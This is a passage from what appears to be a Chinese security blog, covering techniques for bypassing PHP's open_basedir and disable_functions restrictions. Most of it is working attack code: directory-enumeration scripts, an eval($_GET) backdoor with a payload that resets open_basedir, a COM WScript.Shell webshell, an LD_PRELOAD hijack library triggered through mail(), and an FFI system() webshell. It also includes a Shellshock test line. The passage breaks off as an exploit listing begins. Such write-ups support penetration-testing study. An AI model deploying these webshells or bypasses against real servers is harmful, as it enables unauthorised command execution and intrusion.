implode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$relPath</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delfile</span>(<span class="hljs-params"><span class="hljs-variable">$deldir</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (@is_file(<span class="hljs-variable">$deldir</span>)) &#123;<br>        @chmod(<span class="hljs-variable">$deldir</span>,<span class="hljs-number">0777</span>);<br>        <span class="hljs-keyword">return</span> @unlink(<span class="hljs-variable">$deldir</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(@is_dir(<span class="hljs-variable">$deldir</span>))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-variable">$mydir</span> = @opendir(<span class="hljs-variable">$deldir</span>)) == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">false</span> !== (<span class="hljs-variable">$file</span> = @readdir(<span class="hljs-variable">$mydir</span>)))<br>        &#123;<br>            <span class="hljs-variable">$name</span> = File_Str(<span class="hljs-variable">$deldir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file</span>);<br>            <span class="hljs-keyword">if</span>((<span class="hljs-variable">$file</span>!=<span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; (<span class="hljs-variable">$file</span>!=<span class="hljs-string">&#x27;..&#x27;</span>))&#123;delfile(<span class="hljs-variable">$name</span>);&#125;<br>        &#125; <br>        @closedir(<span class="hljs-variable">$mydir</span>);<br>        @chmod(<span class="hljs-variable">$deldir</span>,<span class="hljs-number">0777</span>);<br>        <span class="hljs-keyword">return</span> @rmdir(<span class="hljs-variable">$deldir</span>) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">File_Str</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;//&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-variable">$string</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandStr</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">6</span></span>) </span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$randStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randStr</span> .= substr(<span class="hljs-variable">$chars</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$chars</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randStr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用bindtextdomain和SplFileInfo方法"><a href="#利用bindtextdomain和SplFileInfo方法" class="headerlink" title="利用bindtextdomain和SplFileInfo方法"></a>利用bindtextdomain和SplFileInfo方法</h2><p>bindtextdomain设置或获取域名的路径，函数原型为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">bindtextdomain(<span class="hljs-keyword">string</span> <span class="hljs-variable">$domain</span>, ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$directory</span>): <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>利用原理是基于报错：<code>bindtextdomain()</code>函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false。<br><code>SplFileInfo</code>函数类似。<br>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$re</span> = bindtextdomain(<span class="hljs-string">&#x27;xxx&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]);<br>var_dump(<span class="hljs-variable">$re</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileInfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]);<br>var_dump(<span class="hljs-variable">$info</span>-&gt;getRealPath());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果成功访问到存在的文件是会返回该文件路径：<br><img src="/img/bypass_open_basedir/12.png"></p><p>而如果访问到不存在的文件就会返回<code>false</code><br><img src="/img/bypass_open_basedir/13.png"></p><p>这个方法感觉非常鸡肋,用起来比较恶心，最好与其他方法组合使用。</p><h2 id="利用SplFileInfo-getRealPath-方法"><a href="#利用SplFileInfo-getRealPath-方法" class="headerlink" title="利用SplFileInfo::getRealPath()方法"></a>利用SplFileInfo::getRealPath()方法</h2><p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)<br>SplFileInfo类为单个文件的信息提供了一个高级的面向对象的接口。<br>而其中<code>getRealPath()</code>用于获取文件的绝对路径。bypass原理同样是基于报错，该方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了open_basedir的设定。</p><p>脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));<br>printf(<span class="hljs-string">&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$basedir</span> = <span class="hljs-string">&#x27;D:/CSGO/&#x27;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$info</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileInfo</span>(<span class="hljs-variable">$basedir</span> . <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$i</span>] . <span class="hljs-string">&#x27;&lt;&lt;&#x27;</span>);<br>    <span class="hljs-variable">$re</span> = <span class="hljs-variable">$info</span>-&gt;getRealPath();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$re</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$re</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/bypass_open_basedir/14.png"></p><h2 id="利用realpath列目录"><a href="#利用realpath列目录" class="headerlink" title="利用realpath列目录"></a>利用realpath列目录</h2><p>环境要求:Windows</p><p>realpath()返回规范化的绝对路径名,它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">realpath(<span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span>): <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>bypass原理:<br>与上面说到的两种方式类似。在开启了open_basedir的情况下，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在open_basedir里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，有点像盲注,基于报错来判断文件名。</p><p>脚本入下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));<br>printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br>set_error_handler(<span class="hljs-string">&#x27;isexists&#x27;</span>);<br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;D:/5E/5EClient/&#x27;</span>;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$dir</span> . <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$i</span>] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;<br>        realpath(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/File\((.*)\) is not within/&#x27;</span>;<br>        preg_match(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$matches</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>])) &#123;<br>                printf(<span class="hljs-string">&quot;%s &lt;br/&gt;&quot;</span>, <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]);<br>        &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/bypass_open_basedir/11.png"></p><h2 id="利用chdir与ini-set"><a href="#利用chdir与ini-set" class="headerlink" title="利用chdir与ini_set"></a>利用chdir与ini_set</h2><p><code>chdir</code>将工作目录切换到指定的目录,函数原型为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">chdir(<span class="hljs-keyword">string</span> <span class="hljs-variable">$directory</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p><code>ini_set</code>i用来设置php.ini的值，无需打开php.ini文件，就能修改配置。函数原型为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ini_set(<span class="hljs-keyword">string</span> <span class="hljs-variable">$option</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span>): <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p><p>bypass原理大概open_basedir设计逻辑的安全问题<br>分析过程参考:<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">从PHP底层看open_basedir bypass</a></p><p>一个小demo，将该文件放到网站目录下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;open_basedir: &#x27;</span>.ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;GET: &#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;open_basedir: &#x27;</span>.ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;sub&#x27;</span>);chdir(<span class="hljs-string">&#x27;sub&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/bypass_open_basedir/15.png"><br>open_basedir被设置成了’&#39;,失去原有的限制。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">浅谈几种Bypass open_basedir的方法</a><br><a href="http://diego.team/2020/07/28/PHP-bypass-open_basedir/">PHP bypass open_basedir</a><br><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html">php5全版本绕过open_basedir读文件脚本</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>浅析Bypass disable_functions</title>
    <link href="/2021/08/05/bypass_disable_function/"/>
    <url>/2021/08/05/bypass_disable_function/</url>
    
    <content type="html"><![CDATA[<h2 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h2><p>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p><p><img src="/img/bypass_disable_function/1.png"></p><p>比如拿到一个webshell,用管理工具去连接,执行命令发现<code>ret=127</code>,实际上就是因为被这个限制的原因</p><p><img src="/img/bypass_disable_function/2.png"></p><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open<br></code></pre></td></tr></table></figure><p>观察php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可。</p><h2 id="利用Windows组件COM绕过"><a href="#利用Windows组件COM绕过" class="headerlink" title="利用Windows组件COM绕过"></a>利用Windows组件COM绕过</h2><p>查看<code>com.allow_dcom</code>是否开启,这个默认是不开启的。<br><img src="/img/bypass_disable_function/3.png"></p><p>创建一个COM对象,通过调用COM对象的<code>exec</code>替我们执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>] : <span class="hljs-string">&#x27;wscript&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;wscript&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> COM(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Create Wscript.Shell Failed!&quot;</span>);<br>    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;exec(<span class="hljs-string">&quot;cmd /c&quot;</span>.<span class="hljs-variable">$command</span>);<br>    <span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;StdOut();<br>    <span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;ReadAll();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;application&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> COM(<span class="hljs-string">&quot;Shell.Application&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Shell.Application Failed!&quot;</span>);<br>    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;ShellExecute(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c &quot;</span>.<span class="hljs-variable">$command</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/bypass_disable_function/4.png"></p><h2 id="利用Linux环境变量LD-PRELOAD"><a href="#利用Linux环境变量LD-PRELOAD" class="headerlink" title="利用Linux环境变量LD_PRELOAD"></a>利用Linux环境变量LD_PRELOAD</h2><h3 id="初阶"><a href="#初阶" class="headerlink" title="初阶"></a>初阶</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。<br></code></pre></td></tr></table></figure><p>总的来说就是=<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果。</p><p>思路为:</p><ol><li>创建一个.so文件,linux的动态链接库文件</li><li>使用putenv函数将<code>LD_PRELOAD</code>路径设置为我们自己创建的动态链接库文件</li><li>利用某个函数去触发该动态链接库</li></ol><p>这里以<code>mail()</code>函数举例。<br>在底层c语言中,<code>mail.c</code>中会调用<code>sendmail</code>，而sendmail_path使从ini文件中说明</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">; For Unix only.  <span class="hljs-function">You may supply arguments <span class="hljs-keyword">as</span> <span class="hljs-title">well</span> (<span class="hljs-params"><span class="hljs-literal">default</span>: <span class="hljs-string">&quot;sendmail -t -i&quot;</span></span>).</span> <br>;sendmail_path =<br></code></pre></td></tr></table></figure><p>默认为”sendmail -t -i”<br><img src="/img/bypass_disable_function/8.png"></p><p>但是sendmail并不是默认安装的,需要自己下载</p><p>使用命令<code>readelf -Ws /usr/sbin/sendmail</code>可以看到sendmail调用了哪些库函数,这里选择<code>geteuid</code></p><p><img src="/img/bypass_disable_function/5.png"></p><p><img src="/img/bypass_disable_function/6.png"></p><p>创建一个<code>test.c</code>文件,并定义一个<code>geteuid</code>函数,目的是劫持该函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-keyword">void</span> payload() &#123;<br>    system(<span class="hljs-string">&quot;whoami &gt; /var/tmp/sd.txt&quot;</span>);<br>&#125;<br><span class="hljs-keyword">int</span> geteuid()<br>&#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><p>使用gcc编译为.so文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">gcc <span class="hljs-literal">-c</span> <span class="hljs-literal">-fPIC</span> test.c <span class="hljs-literal">-o</span> test<br>gcc <span class="hljs-literal">-shared</span> test <span class="hljs-literal">-o</span> test.so<br></code></pre></td></tr></table></figure><p>这里有个坑:不要在windows上编译,编译出来是MZ头,不是ELF。</p><p>然后再上传test.so到指定目录下。</p><p>最后创建<code>shell.php</code>文件,上传到网站目录下,这里.so文件路径要写对。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/var/www/test.so&quot;</span>);<br>mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再理一下整个过程:当我们访问shell.php文件的时候,先会将<code>LD_PRELOAD</code>路径设置为恶意的.so文件，然后触发mail()函数,mail函数会调用sendmail函数,sendmail函数会调用库函数geteuid,而库函数geteuid已经被优先加载,这时执行geteuid就是执行的我们自己定义的函数,并执行payload(),也就是代码中的<code>whoami</code>命令写入到sd.txt中。</p><p>由于拿到的webshell很有可能是<code>www-data</code>这种普通权限。<br>整个过程要注意权限问题,要可写的目录下。<br><img src="/img/bypass_disable_function/7.png"></p><p><img src="/img/bypass_disable_function/9.png"></p><p>web访问页面没有文件写出,可以看看定义的目录是否有权限。</p><h3 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h3><p>在整个流程中,唯一担心的是sendmail没有安装怎么办,它可不是默认安装的,而拿到的webshell权限一般也不高,无法自行安装,也不能改php.ini。</p><p>而有前辈早已指出:<a href="https://www.freebuf.com/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br>细节已经说的非常明白,这里只复现,在此不再画蛇添足。</p><p>去github下载三个重要文件:<br>bypass_disablefunc.php,bypass_disablefunc_x64.so或bypass_disablefunc_x86.so,bypass_disablefunc.c<br>将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so传到目标有权限的目录中。<br>这里很有可能无法直接上传到web目录,解决办法就是上传到有权限的目录下,并用include去包含。<br><img src="/img/bypass_disable_function/10.png"></p><p>这里我已经卸载了sendmail文件<br><img src="/img/bypass_disable_function/11.png"></p><p>注意区分post和get<br><img src="/img/bypass_disable_function/12.png"></p><h2 id="利用PHP7-4-FFI绕过"><a href="#利用PHP7-4-FFI绕过" class="headerlink" title="利用PHP7.4 FFI绕过"></a>利用PHP7.4 FFI绕过</h2><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。<br>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。<br>具体请参考<a href="https://www.php.net/manual/en/book.ffi.php">Foreign Function Interface</a></p><p>当前php版本为7.4.3<br><img src="/img/bypass_disable_function/14.png"></p><p>先看FFI是否开启,并且ffi.enable需要设置为true<br><img src="/img/bypass_disable_function/13.png"></p><p>使用FFI::cdef创建一个新的FFI对象<br><img src="/img/bypass_disable_function/15.png"></p><p>通过c语言的system去执行,绕过disable functions。<br>将返回结果写入/tmp/SD，并在每次读出结果后用unlink()函数删除它。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span> &gt; /tmp/SD&quot;</span>);       <span class="hljs-comment">//由GET传参的任意代码执行</span><br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br>@unlink(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/bypass_disable_function/16.png"></p><h2 id="利用Bash-Shellshock-CVE-2014-6271-破壳漏洞"><a href="#利用Bash-Shellshock-CVE-2014-6271-破壳漏洞" class="headerlink" title="利用Bash Shellshock(CVE-2014-6271)破壳漏洞"></a>利用Bash Shellshock(CVE-2014-6271)破壳漏洞</h2><p>利用条件php &lt; 5.6.2 &amp; bash &lt;= 4.3（破壳）</p><p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>简单测试是否存在破壳漏洞:<br>命令行输入<code> env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如果输出了<code>vulnerable</code>，则说明存在bash破壳漏洞<br><img src="/img/bypass_disable_function/18.png"></p><p><a href="https://www.exploit-db.com/exploits/35146">EXP</a>如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 